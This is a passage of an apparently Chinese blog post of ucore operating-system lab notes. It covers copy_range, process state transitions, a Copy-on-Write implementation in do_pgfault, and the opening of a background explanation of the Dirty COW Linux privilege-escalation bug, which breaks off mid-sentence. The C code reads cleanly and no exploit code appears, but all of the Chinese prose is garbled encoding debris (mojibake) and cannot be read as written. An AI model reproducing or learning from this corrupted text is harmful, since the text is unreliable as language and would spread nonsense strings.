unitæ¥å¤åˆ¶å†…å­˜å†…å®¹, è¿™æ ·å¯ä»¥åŒæ—¶æ›´æ”¹pteçš„å†…å®¹. </p><p>è¿‡ç¨‹æ¦‚è¿°: å¯¹äºvmaä¸­çš„ç¬¬ä¸€ä¸ªåœ°å€startæ¥è¯´, å–å‡º(pde_t *)fromä¸­çš„pte, ç”¨pte2pageè½¬æ¢æˆstartåœ°å€å¼€å§‹çš„ä¸€ä¸ªpage, ç„¶åç”¨get_pteæ‰¾åˆ°æˆ–åˆ›å»ºtoä¸­startåœ°å€å¯¹åº”çš„pte, ä¹Ÿè½¬æ¢æˆpage(å³npage). ç„¶åæ˜¾è€Œæ˜“è§çš„, æˆ‘ä»¬éœ€è¦è½¬æ¢page2kvaæ¥å½“åšmemcpy()çš„å‚æ•°æ¥å¤åˆ¶æ•´ä¸ªé¡µçš„å†…å®¹, è¿›ä¸€æ­¥è°ƒç”¨page_insert()æ¥åœ¨toä¸­æŠŠ è™šæ‹Ÿåœ°å€start å’Œ npage å»ºç«‹æ˜ å°„å…³ç³». </p><p>ä¸€äº›ç»†èŠ‚æ³¨é‡Šåœ¨ä¸‹é¢, æ•´ä¸ªå¾ªç¯çš„å˜é‡å°±æ˜¯ä¸æ–­æŒ‰ç…§pagesizeå¢åŠ çš„startè™šæ‹Ÿåœ°å€.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* copy_range - copy content of memory (start, end) of one process A to another process B</span><br><span class="hljs-comment"> * @to:    the addr of process B&#x27;s Page Directory</span><br><span class="hljs-comment"> * @from:  the addr of process A&#x27;s Page Directory</span><br><span class="hljs-comment"> * @share: flags to indicate to dup OR share. We just use dup method, so it didn&#x27;t be used.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * CALL GRAPH: copy_mm--&gt;dup_mmap--&gt;copy_range</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">copy_range</span><span class="hljs-params">(<span class="hljs-keyword">pde_t</span> *to, <span class="hljs-keyword">pde_t</span> *from, <span class="hljs-keyword">uintptr_t</span> start, <span class="hljs-keyword">uintptr_t</span> end, <span class="hljs-keyword">bool</span> share)</span> </span>&#123;<br>    assert(start % PGSIZE == <span class="hljs-number">0</span> &amp;&amp; end % PGSIZE == <span class="hljs-number">0</span>);<br>    assert(USER_ACCESS(start, end));<br>    <span class="hljs-comment">// copy content by page unit.</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">//call get_pte to find process A&#x27;s pte according to the addr start</span><br>        <span class="hljs-keyword">pte_t</span> *ptep = get_pte(from, start, <span class="hljs-number">0</span>), *nptep;  <span class="hljs-comment">// nptep for new page table entry pointer</span><br>        <span class="hljs-keyword">if</span> (ptep == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-comment">// this page table does not exit, so skip whole memory that mapped by a page table</span><br>            <span class="hljs-comment">// why would this happen?</span><br>            <span class="hljs-comment">// PTSIZE : bytes mapped by a page directory entry</span><br>            start = ROUNDDOWN(start + PTSIZE, PTSIZE);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">//call get_pte to find process B&#x27;s pte according to the addr start. If pte is NULL, just alloc a PT</span><br>        <span class="hljs-keyword">if</span> (*ptep &amp; PTE_P) &#123;<br>            <span class="hljs-keyword">if</span> ((nptep = get_pte(to, start, <span class="hljs-number">1</span>)) == <span class="hljs-literal">NULL</span>) &#123;<br>                <span class="hljs-keyword">return</span> -E_NO_MEM;<br>            &#125;<br>            <span class="hljs-keyword">uint32_t</span> perm = (*ptep &amp; PTE_USER);<br>            <span class="hljs-comment">//get page from ptep</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span> =</span> pte2page(*ptep);<br>            <span class="hljs-comment">// alloc a page for process B</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">npage</span> =</span> alloc_page();<br>            assert(page != <span class="hljs-literal">NULL</span>);<br>            assert(npage != <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-comment">/* LAB5:EXERCISE2 YOUR CODE</span><br><span class="hljs-comment">             * (1) find src_kvaddr: the kernel virtual address of page</span><br><span class="hljs-comment">             * (2) find dst_kvaddr: the kernel virtual address of npage</span><br><span class="hljs-comment">             * (3) memory copy from src_kvaddr to dst_kvaddr, size is PGSIZE</span><br><span class="hljs-comment">             * (4) build the map of phy addr of  nage with the linear addr start</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">uintptr_t</span> src_kvaddr, dst_kvaddr;<br>            src_kvaddr = page2kva(page);<br>            dst_kvaddr = page2kva(npage);<br>            <span class="hljs-built_in">memcpy</span>(dst_kvaddr, src_kvaddr, PGSIZE);<br>            ret = page_insert(to, npage, start, perm);<br>            assert(ret == <span class="hljs-number">0</span>);<br>        &#125;<br>        start += PGSIZE;<br>    &#125; <span class="hljs-keyword">while</span> (start != <span class="hljs-number">0</span> &amp;&amp; start &lt; end);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="ç»ƒä¹ 3-1"><a href="#ç»ƒä¹ 3-1" class="headerlink" title="ç»ƒä¹ 3"></a>ç»ƒä¹ 3</h3><blockquote><p>åˆ†æfork/exec/wait/exit å’Œ ç³»ç»Ÿè°ƒç”¨çš„å®ç°</p></blockquote><p>å†™åœ¨çŸ¥è¯†ç‚¹é‡Œ</p><ul><li>è¯·åˆ†æfork/exec/wait/exitåœ¨å®ç°ä¸­æ˜¯å¦‚ä½•å½±å“è¿›ç¨‹çš„æ‰§è¡ŒçŠ¶æ€çš„ï¼Ÿ<ul><li>forkä¼šä¿®æ”¹å…¶å­è¿›ç¨‹çš„çŠ¶æ€ä¸º<code>PROC_RUNNABLE</code>ï¼Œè€Œå½“å‰è¿›ç¨‹çŠ¶æ€ä¸å˜ã€‚</li><li>execä¸ä¿®æ”¹å½“å‰è¿›ç¨‹çš„çŠ¶æ€ï¼Œä½†ä¼šæ›¿æ¢å†…å­˜ç©ºé—´é‡Œæ‰€æœ‰çš„æ•°æ®ä¸ä»£ç ã€‚</li><li>waitä¼šå…ˆæ£€æµ‹æ˜¯å¦å­˜åœ¨å­è¿›ç¨‹ã€‚å¦‚æœå­˜åœ¨è¿›å…¥<code>PROC_ZOMBIE</code>çš„å­è¿›ç¨‹ï¼Œåˆ™å›æ”¶è¯¥è¿›ç¨‹å¹¶å‡½æ•°è¿”å›ã€‚ä½†è‹¥å­˜åœ¨å°šå¤„äº<code>PROC_RUNNABLE</code>çš„å­è¿›ç¨‹ï¼Œåˆ™å½“å‰è¿›ç¨‹ä¼šè¿›å…¥<code>PROC_SLEEPING</code>çŠ¶æ€ï¼Œå¹¶ç­‰å¾…å­è¿›ç¨‹å”¤é†’ã€‚</li><li>exitä¼šå°†å½“å‰è¿›ç¨‹çŠ¶æ€è®¾ç½®ä¸º<code>PROC_ZOMBIE</code>ï¼Œå¹¶å”¤é†’çˆ¶è¿›ç¨‹ï¼Œä½¿å…¶å¤„äº<code>PROC_RUNNABLE</code>çš„çŠ¶æ€ï¼Œä¹‹åä¸»åŠ¨è®©å‡ºCPUã€‚</li></ul></li><li>è¯·ç»™å‡ºucoreä¸­ä¸€ä¸ªç”¨æˆ·æ€è¿›ç¨‹çš„æ‰§è¡ŒçŠ¶æ€ç”Ÿå‘½å‘¨æœŸå›¾ï¼ˆåŒ…æ‹¬æ‰§è¡ŒçŠ¶æ€ï¼Œæ‰§è¡ŒçŠ¶æ€ä¹‹é—´çš„å˜æ¢å…³ç³»ï¼Œä»¥åŠäº§ç”Ÿå˜æ¢çš„äº‹ä»¶æˆ–å‡½æ•°è°ƒç”¨ï¼‰ã€‚<a href="https://kiprey.github.io/2020/08/uCore-5/#Questions">link</a> </li></ul><pre><code class=" mermaid">stateDiagram-v2[*]--&gt;UNINIT : alloc_procUNINIT--&gt;RUNNABLE : proc_init/wakeup_procRUNNING--&gt;SLEEPING : try_free_pages/do_wait/do_sleepRUNNING--&gt;ZOMBIE : do_exitRUNNABLE--&gt;RUNNING :è°ƒåº¦å™¨è°ƒåº¦RUNNING--&gt;RUNNABLE :æ—¶é—´ç‰‡è€—å°½SLEEPING--&gt;RUNNABLE : wakeup_procZOMBIE--&gt;[*]:èµ„æºå›æ”¶</code></pre><h3 id="Big-Challenge-Dirty-COW"><a href="#Big-Challenge-Dirty-COW" class="headerlink" title="Big Challenge: Dirty COW"></a>Big Challenge: Dirty COW</h3><blockquote><p><strong>å®ç° Copy on Write ï¼ˆCOWï¼‰æœºåˆ¶</strong> </p><p>åŒæ—¶ï¼Œç”±äºCOWå®ç°æ¯”è¾ƒå¤æ‚ï¼Œå®¹æ˜“å¼•å…¥bugï¼Œè¯·å‚è€ƒ <a href="https://dirtycow.ninja/">Dirty COW (CVE-2016-5195)</a> çœ‹çœ‹èƒ½å¦åœ¨ucoreçš„COWå®ç°ä¸­æ¨¡æ‹Ÿè¿™ä¸ªé”™è¯¯å’Œè§£å†³æ–¹æ¡ˆã€‚éœ€è¦æœ‰è§£é‡Šã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªbig challenge.</p></blockquote><p><a href="https://www.cnblogs.com/BlueR1ver/p/15758828.html">blog</a> </p><p><a href="https://zhuanlan.zhihu.com/p/439091715">ä»é›¶å…¥é—¨linuxå†…æ ¸å®‰å…¨ï¼šè„ç‰›ææƒæ¼æ´åˆ†æä¸è¡¥ä¸åˆ†æ(CVE-2016-5195)</a> </p><p>[<a href="https://bbs.pediy.com/thread-264199.htm#msg_header_h3_0">åŸåˆ›]Linuxå†…æ ¸[CVE-2016-5195] (dirty COW)åŸç†åˆ†æ</a> </p><h4 id="1-æ€è·¯"><a href="#1-æ€è·¯" class="headerlink" title="1. æ€è·¯"></a>1. æ€è·¯</h4><p><strong>å†™æ—¶å¤åˆ¶</strong>ï¼ˆ<strong>Copy-on-write</strong>ï¼Œç®€ç§°<strong>COW</strong>ï¼‰æ˜¯ä¸€ç§è®¡ç®—æœºç¨‹åºè®¾è®¡é¢†åŸŸçš„ä¼˜åŒ–ç­–ç•¥ã€‚å…¶æ ¸å¿ƒæ€æƒ³æ˜¯ï¼Œå¦‚æœæœ‰å¤šä¸ªè°ƒç”¨è€…ï¼ˆcallersï¼‰åŒæ—¶è¯·æ±‚ç›¸åŒèµ„æºï¼ˆå¦‚å†…å­˜æˆ–ç£ç›˜ä¸Šçš„æ•°æ®å­˜å‚¨ï¼‰ï¼Œä»–ä»¬ä¼šä½¿ç”¨æŒ‡é’ˆæŒ‡å‘ç›¸åŒçš„èµ„æºï¼Œç›´åˆ°<strong>æŸä¸ªè°ƒç”¨è€…</strong>è¯•å›¾ä¿®æ”¹èµ„æºçš„å†…å®¹æ—¶ï¼Œç³»ç»Ÿæ‰ä¼šçœŸæ­£å¤åˆ¶ä¸€ä»½ä¸“ç”¨å‰¯æœ¬ï¼ˆprivate copyï¼‰ç»™è¯¥è°ƒç”¨è€…ï¼Œè€Œå…¶ä»–è°ƒç”¨è€…æ‰€è§åˆ°çš„æœ€åˆçš„èµ„æºä»ç„¶ä¿æŒä¸å˜ã€‚</p><p>å…·ä½“åˆ°ucoreè€Œè¨€, å½“ä¸€ä¸ªç”¨æˆ·çˆ¶è¿›ç¨‹åˆ›å»ºè‡ªå·±çš„å­è¿›ç¨‹æ—¶ï¼Œç¼ºé¡µå¤„ç†ä¾‹ç¨‹ä¼šæŠŠçˆ¶å­è¿›ç¨‹çš„é¡µè¡¨é¡¹æ”¹ä¸º<strong>åªè¯»</strong>ï¼Œå­è¿›ç¨‹å¯å…±äº«çˆ¶è¿›ç¨‹å ç”¨çš„ç”¨æˆ·å†…å­˜ç©ºé—´ä¸­çš„é¡µé¢ï¼ˆè¿™å°±æ˜¯ä¸€ä¸ªå…±äº«çš„èµ„æºï¼‰ã€‚å½“å…¶ä¸­ä»»ä½•ä¸€ä¸ªè¿›ç¨‹ä¿®æ”¹æ­¤ç”¨æˆ·å†…å­˜ç©ºé—´ä¸­çš„æŸé¡µé¢æ—¶ï¼Œucoreä¼šé€šè¿‡page faultå¼‚å¸¸è·çŸ¥è¯¥æ“ä½œï¼Œå¹¶å®Œæˆæ‹·è´å†…å­˜é¡µé¢ï¼Œä½¿å¾—ä¸¤ä¸ªè¿›ç¨‹éƒ½æœ‰å„è‡ªçš„å†…å­˜é¡µé¢ã€‚è¿™æ ·ä¸€ä¸ªè¿›ç¨‹æ‰€åšçš„ä¿®æ”¹ä¸ä¼šè¢«å¦å¤–ä¸€ä¸ªè¿›ç¨‹å¯è§äº†ã€‚</p><h4 id="2-å…·ä½“å®ç°"><a href="#2-å…·ä½“å®ç°" class="headerlink" title="2. å…·ä½“å®ç°"></a>2. å…·ä½“å®ç°</h4><ul><li><p>å½“è¿›è¡Œå†…å­˜è®¿é—®æ—¶ï¼ŒCPUä¼šæ ¹æ®PTEä¸Šçš„è¯»å†™ä½<code>PTE_P</code>ã€<code>PTE_W</code>æ¥ç¡®å®šå½“å‰å†…å­˜æ“ä½œæ˜¯å¦å…è®¸ï¼Œå¦‚æœä¸å…è®¸ï¼Œåˆ™ç¼ºé¡µä¸­æ–­ã€‚æˆ‘ä»¬å¯ä»¥åœ¨<code>copy_range</code>å‡½æ•°ä¸­ï¼Œå°†çˆ¶è¿›ç¨‹ä¸­æ‰€æœ‰PTEä¸­çš„<code>PTE_W</code>ç½®ä¸º0ï¼Œè¿™æ ·ä¾¿å¯ä»¥å°†çˆ¶è¿›ç¨‹ä¸­æ‰€æœ‰ç©ºé—´éƒ½è®¾ç½®ä¸ºåªè¯»ã€‚ç„¶åä½¿å­è¿›ç¨‹çš„PTEå…¨éƒ¨æŒ‡å‘çˆ¶è¿›ç¨‹ä¸­PTEå­˜æ”¾çš„ç‰©ç†åœ°å€ï¼Œè¿™æ ·ä¾¿å¯ä»¥è¾¾åˆ°å†…å­˜å…±äº«çš„ç›®çš„ã€‚</p><blockquote><p>ä¸ºä»€ä¹ˆè¦è®¾ç½®çˆ¶è¿›ç¨‹æ‰€æœ‰ç©ºé—´ä¸ºåªè¯»å‘¢ï¼Œå› ä¸ºåœ¨ä¹‹åçš„å†…å­˜æ“ä½œä¸­ï¼Œå¦‚æœå¯¹è¿™äº›ç©ºé—´è¿›è¡Œå†™æ“ä½œçš„è¯ï¼Œç¨‹åºå°±ä¼šè§¦å‘ç¼ºé¡µä¸­æ–­ï¼Œé‚£ä¹ˆCPUå°±å¯ä»¥åœ¨ç¼ºé¡µä¸­æ–­ç¨‹åºä¸­å¤åˆ¶è¯¥å†…å­˜ï¼Œä¹Ÿå°±æ˜¯å†™æ—¶å¤åˆ¶ã€‚</p></blockquote><blockquote><p>ä¸ºä»€ä¹ˆåœ¨copy_rangeå‡½æ•°ä¸­å®ç°å†…å­˜å…±äº«å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬å¯ä»¥åœ¨è¯¥å‡½æ•°ä¸­å¯¹å…¶ä¼ å…¥çš„<code>share</code>å‚æ•°è¿›è¡Œå¤„ç†ã€‚</p></blockquote><p>æœ€ç»ˆå®ç°æŠŠæ‹·è´å†…å­˜çš„éƒ¨åˆ†æ¢æˆå¤åˆ¶ä¸€ä¸‹pteçš„å†…å®¹å°±å¯ä»¥äº†:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">...         <span class="hljs-keyword">if</span>(share)<br>            &#123;<br>                cprintf(<span class="hljs-string">&quot;Sharing the page 0x%x\n&quot;</span>, page2kva(page));<br>                <span class="hljs-comment">// ç‰©ç†é¡µé¢å…±äº«ï¼Œå¹¶è®¾ç½®ä¸¤ä¸ªPTEä¸Šçš„æ ‡å¿—ä½ä¸ºåªè¯»</span><br>                page_insert(from, page, start, perm &amp; ~PTE_W);<br>                ret = page_insert(to, page, start, perm &amp; ~PTE_W);<br>            &#125;<br>            <span class="hljs-comment">// å®Œæ•´æ‹·è´å†…å­˜</span><br>            <span class="hljs-keyword">else</span><br>            &#123;<br>...<br>            &#125; ...<br></code></pre></div></td></tr></table></figure></li><li><p>å½“æŸä¸ªè¿›ç¨‹æƒ³å†™å…¥ä¸€ä¸ªå…±äº«å†…å­˜æ—¶ï¼Œç”±äºPTEä¸Šçš„<code>PTE_W</code>ä¸º0ï¼Œæ‰€ä»¥ä¼šè§¦å‘ç¼ºé¡µä¸­æ–­å¤„ç†ç¨‹åºã€‚æ­¤æ—¶è¿›ç¨‹éœ€è¦åœ¨ç¼ºé¡µä¸­æ–­å¤„ç†ç¨‹åºä¸­å¤åˆ¶è¯¥é¡µå†…å­˜ï¼Œå¹¶è®¾ç½®è¯¥é¡µå†…å­˜æ‰€å¯¹åº”çš„<code>PTE_W</code>ä¸º1ã€‚</p><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æ‰§è¡Œç¼ºé¡µä¸­æ–­å¤„ç†ç¨‹åºä¸­çš„å†…å­˜å¤åˆ¶æ“ä½œå‰ï¼Œéœ€è¦å…ˆæ£€æŸ¥è¯¥ç‰©ç†é¡µçš„å¼•ç”¨æ¬¡æ•°ã€‚å¦‚æœè¯¥å¼•ç”¨æ¬¡æ•°å·²ç»ä¸º1äº†ï¼Œåˆ™è¡¨æ˜æ­¤æ—¶çš„ç‰©ç†é¡µåªæœ‰å½“å‰è¿›ç¨‹æ‰€ä½¿ç”¨ï¼Œæ•…å¯ä»¥ç›´æ¥è®¾ç½®è¯¥é¡µå†…å­˜æ‰€å¯¹åº”çš„<code>PTE_W</code>ä¸º1å³å¯ï¼Œä¸éœ€è¦è¿›è¡Œå†…å­˜å¤åˆ¶ã€‚</p></blockquote><p>æœ€ç»ˆå®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_pgfault</span><span class="hljs-params">(struct mm_struct *mm, <span class="hljs-keyword">uint32_t</span> error_code, <span class="hljs-keyword">uintptr_t</span> addr)</span> </span>&#123;<br>    <span class="hljs-comment">// ........</span><br>   <span class="hljs-comment">// æŸ¥æ‰¾å½“å‰è™šæ‹Ÿåœ°å€æ‰€å¯¹åº”çš„é¡µè¡¨é¡¹</span><br>    <span class="hljs-keyword">if</span> ((ptep = get_pte(mm-&gt;pgdir, addr, <span class="hljs-number">1</span>)) == <span class="hljs-literal">NULL</span>) &#123;<br>        cprintf(<span class="hljs-string">&quot;get_pte in do_pgfault failed\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> failed;<br>    &#125;<br>    <span class="hljs-comment">// å¦‚æœè¿™ä¸ªé¡µè¡¨é¡¹æ‰€å¯¹åº”çš„ç‰©ç†é¡µä¸å­˜åœ¨ï¼Œåˆ™</span><br>    <span class="hljs-keyword">if</span> (*ptep == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// åˆ†é…ä¸€å—ç‰©ç†é¡µï¼Œå¹¶è®¾ç½®é¡µè¡¨é¡¹</span><br>        <span class="hljs-keyword">if</span> (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="hljs-literal">NULL</span>) &#123;<br>            cprintf(<span class="hljs-string">&quot;pgdir_alloc_page in do_pgfault failed\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//ä¸ä¸ºç©ºè¯´æ˜éœ€è¦swapæˆ–è€…COW</span><br>        struct Page *page=<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-comment">// å¦‚æœå½“å‰é¡µé”™è¯¯çš„åŸå› æ˜¯å†™å…¥äº†åªè¯»é¡µé¢</span><br>        <span class="hljs-keyword">if</span> (*ptep &amp; PTE_P) &#123;<br>            <span class="hljs-comment">// å†™æ—¶å¤åˆ¶ï¼šå¤åˆ¶ä¸€å—å†…å­˜ç»™å½“å‰è¿›ç¨‹</span><br>            cprintf(<span class="hljs-string">&quot;\n\nCOW: ptep 0x%x, pte 0x%x\n&quot;</span>,ptep, *ptep);<br>            <span class="hljs-comment">// åŸå…ˆæ‰€ä½¿ç”¨çš„åªè¯»ç‰©ç†é¡µ</span><br>            page = pte2page(*ptep);<br>            <span class="hljs-comment">// å¦‚æœè¯¥ç‰©ç†é¡µé¢è¢«å¤šä¸ªè¿›ç¨‹å¼•ç”¨</span><br>            <span class="hljs-keyword">if</span>(page_ref(page) &gt; <span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-comment">// é‡Šæ”¾å½“å‰PTEçš„å¼•ç”¨å¹¶åˆ†é…ä¸€ä¸ªæ–°ç‰©ç†é¡µ</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span>* <span class="hljs-title">newPage</span> =</span> pgdir_alloc_page(mm-&gt;pgdir, addr, perm);<br>                <span class="hljs-keyword">void</span> * kva_src = page2kva(page);<br>                <span class="hljs-keyword">void</span> * kva_dst = page2kva(newPage);<br>                <span class="hljs-comment">// æ‹·è´æ•°æ®</span><br>                <span class="hljs-built_in">memcpy</span>(kva_dst, kva_src, PGSIZE);<br>            &#125;<br>            <span class="hljs-comment">// å¦‚æœè¯¥ç‰©ç†é¡µé¢åªè¢«å½“å‰è¿›ç¨‹æ‰€å¼•ç”¨,å³page_refç­‰1</span><br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-comment">// åˆ™å¯ä»¥ç›´æ¥æ‰§è¡Œpage_insertï¼Œä¿ç•™å½“å‰ç‰©ç†é¡µå¹¶é‡è®¾å…¶PTEæƒé™ã€‚</span><br>                page_insert(mm-&gt;pgdir, page, addr, perm);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-comment">// å¦‚æœswapå·²ç»åˆå§‹åŒ–å®Œæˆ</span><br>            <span class="hljs-keyword">if</span>(swap_init_ok) &#123;<br>                <span class="hljs-comment">// å°†ç›®æ ‡æ•°æ®åŠ è½½åˆ°æŸå—æ–°çš„ç‰©ç†é¡µä¸­ã€‚</span><br>                <span class="hljs-comment">// è¯¥ç‰©ç†é¡µå¯èƒ½æ˜¯å°šæœªåˆ†é…çš„ç‰©ç†é¡µï¼Œä¹Ÿå¯èƒ½æ˜¯ä»åˆ«çš„å·²åˆ†é…ç‰©ç†é¡µä¸­å–çš„</span><br>                <span class="hljs-keyword">if</span> ((ret = swap_in(mm, addr, &amp;page)) != <span class="hljs-number">0</span>) &#123;<br>                    cprintf(<span class="hljs-string">&quot;swap_in in do_pgfault failed\n&quot;</span>);<br>                    <span class="hljs-keyword">goto</span> failed;<br>                &#125;<br>                <span class="hljs-comment">// å°†è¯¥ç‰©ç†é¡µä¸å¯¹åº”çš„è™šæ‹Ÿåœ°å€å…³è”ï¼ŒåŒæ—¶è®¾ç½®é¡µè¡¨ã€‚</span><br>                page_insert(mm-&gt;pgdir, page, addr, perm);<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                cprintf(<span class="hljs-string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);<br>                <span class="hljs-keyword">goto</span> failed;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// å½“å‰ç¼ºå¤±çš„é¡µå·²ç»åŠ è½½å›å†…å­˜ä¸­ï¼Œæ‰€ä»¥è®¾ç½®å½“å‰é¡µä¸ºå¯swapã€‚</span><br>        swap_map_swappable(mm, addr, page, <span class="hljs-number">1</span>);<br>        page-&gt;pra_vaddr = addr;<br>   &#125;<br>   ret = <span class="hljs-number">0</span>;<br>failed:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="3-Dirty-COWæµ…æ"><a href="#3-Dirty-COWæµ…æ" class="headerlink" title="3.Dirty COWæµ…æ"></a>3.Dirty COWæµ…æ</h4><h5 id="0x00-å…³äºlinuxå†…æ ¸èƒŒæ™¯çŸ¥è¯†"><a href="#0x00-å…³äºlinuxå†…æ ¸èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="0x00 å…³äºlinuxå†…æ ¸èƒŒæ™¯çŸ¥è¯†"></a>0x00 å…³äºlinuxå†…æ ¸èƒŒæ™¯çŸ¥è¯†</h5><p>å’Œucoreéå¸¸ç›¸ä¼¼, æ¯”å¦‚mm_struct, vma, copy_rangeä¸€äº›å‡½æ•°. ä¸‹é¢æ˜¯è¿™ä¸ªæ¼æ´çš„ç›¸å…³èƒŒæ™¯.</p><ul><li><a href="https://man7.org/linux/man-pages/man2/madvise.2.html">madvise</a>(): å†…æ ¸å¯¹è¯¥åŒºåŸŸçš„ç”¨æˆ·è™šæ‹Ÿå†…å­˜åº”éµå¾ªç‰¹å®šçš„ä½¿ç”¨æ¨¡å¼<ul><li>MADV_DONTNEEDå‚æ•°:</li></ul></li><li><a href="https://man7.org/linux/man-pages/man2/mmap.2.html">mmap</a>():<ul><li>MAP_PRIVATEå‚æ•°: Create a private copy-on-write mapping.  Updates to the mapping are not visible to other processes mapping the same file, and are not carried through to the underlying file. </li></ul></li></ul><h5 id="0x01-æ¦‚è¿°"><a href="#0x01-æ¦‚è¿°" class="headerlink" title="0x01 æ¦‚è¿°"></a>0x01 æ¦‚è¿°</h5><p>è¯¥æ¼æ´æ˜¯Linuxçš„ä¸€ä¸ªæœ¬åœ°ææƒæ¼æ´ï¼Œå‘ç°è€…æ˜¯Phil Oesterï¼Œå½±å“&gt;=2.6.22çš„æ‰€æœ‰Linuxå†…æ ¸ç‰ˆæœ¬ï¼Œä¿®å¤æ—¶é—´æ˜¯2016å¹´10æœˆ18å·ã€‚è¯¥æ¼æ´çš„åŸå› æ˜¯<code>get_user_page</code>å†…æ ¸å‡½æ•°åœ¨å¤„ç†<code>Copy-on-Write</code>(ä»¥ä¸‹ä½¿ç”¨COWè¡¨ç¤º)çš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½äº§å‡ºç«æ€æ¡ä»¶é€ æˆCOWè¿‡ç¨‹è¢«ç ´åï¼Œå¯¼è‡´å‡ºç°å†™æ•°æ®åˆ°è¿›ç¨‹åœ°å€ç©ºé—´å†…åªè¯»å†…å­˜åŒºåŸŸçš„æœºä¼šã€‚å½“æˆ‘ä»¬å‘å¸¦æœ‰MAP_PRIVATEæ 